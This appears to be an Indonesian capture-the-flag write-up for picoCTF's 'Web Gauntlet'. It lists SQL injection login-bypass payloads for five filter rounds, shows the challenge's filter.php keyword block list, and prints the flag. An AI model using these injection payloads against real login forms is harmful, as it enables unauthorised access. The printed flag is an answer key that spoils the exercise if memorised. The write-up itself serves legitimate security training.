# Web Gauntlet
- Link: https://play.picoctf.org/practice/challenge/88?category=1&page=3

## Tantangan
Can you beat the filters? Log in as admin http://jupiter.challenges.picoctf.org:9683/ http://jupiter.challenges.picoctf.org:9683/filter.php

## Penyelesaian
- Buka URL http://jupiter.challenges.picoctf.org:9683/ di browser untuk membuka form login

- Buka URL http://jupiter.challenges.picoctf.org:9683/filter.php di tab baru untuk melihat daftar string yang di filter


- Di ronde 1 string yang difilter hanya `or` jadi kita bisa memasukkan username berikut dan sembarang password
```sh
admin' --
```

- Inputan diatas akan membentuk query sebagai berikut
```sh
SELECT * FROM users WHERE username='admin' --' AND password='asdf'
```

- Di ronde 2 string yang difilter adalah sebagai berikut

- Dironde 2 kita bisa menginput username sebagai berikut dan passwordnya bebas
```sh
admin'/*
```

- Inputan diatas akan membentuk query sebagai berikut
```sh
SELECT * FROM users WHERE username='admin'/*' AND password='asdf'
```

- Di ronde 3 string yang difilter adalah sebagai berikut

- Dironde 3 kita bisa menginput username seperti ronde sebelumnya dan passwordnya bebas
```sh
admin'/*
```

- Inputan diatas akan membentuk query sebagai berikut
```sh
SELECT * FROM users WHERE username='admin'/*' AND password='asdf'
```

- Di ronde 4 string yang difilter adalah sebagai berikut

- Dironde 4 kita bisa menginput username seperti ronde sebelumnya dan passwordnya bebas
```sh
adm'||'in'/*
```

- Inputan diatas akan membentuk query sebagai berikut
```sh
SELECT * FROM users WHERE username='adm'||'in'/*' AND password='asdf'
```

- Di ronde 5 string yang difilter adalah sebagai berikut

- Dironde 5 kita bisa menginput username seperti ronde sebelumnya dan passwordnya bebas
```sh
ad'||'min'/*
```

- Inputan diatas akan membentuk query sebagai berikut
```sh
SELECT * FROM users WHERE username='ad'||'min'/*' AND password='asdf'
```

Sekarang kita buka URL http://jupiter.challenges.picoctf.org:9683/filter.php untuk mendapatkan flag. Berikut adalah isi halaman setelah kita berhasil membypass login
```sh
 <?php
session_start();

if (!isset($_SESSION["round"])) {
    $_SESSION["round"] = 1;
}
$round = $_SESSION["round"];
$filter = array("");
$view = ($_SERVER["PHP_SELF"] == "/filter.php");

if ($round === 1) {
    $filter = array("or");
    if ($view) {
        echo "Round1: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 2) {
    $filter = array("or", "and", "like", "=", "--");
    if ($view) {
        echo "Round2: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 3) {
    $filter = array(" ", "or", "and", "=", "like", ">", "<", "--");
    // $filter = array("or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
    if ($view) {
        echo "Round3: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 4) {
    $filter = array(" ", "or", "and", "=", "like", ">", "<", "--", "admin");
    // $filter = array(" ", "/**/", "--", "or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
    if ($view) {
        echo "Round4: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 5) {
    $filter = array(" ", "or", "and", "=", "like", ">", "<", "--", "union", "admin");
    // $filter = array("0", "unhex", "char", "/*", "*/", "--", "or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
    if ($view) {
        echo "Round5: ".implode(" ", $filter)."<br/>";
    }
} else if ($round >= 6) {
    if ($view) {
        highlight_file("filter.php");
    }
} else {
    $_SESSION["round"] = 1;
}

// picoCTF{y0u_m4d3_1t_d846125f7bdbf4d6e89cbc5edb6fa739}
?>
```
- Flag
```sh
picoCTF{y0u_m4d3_1t_d846125f7bdbf4d6e89cbc5edb6fa739}
```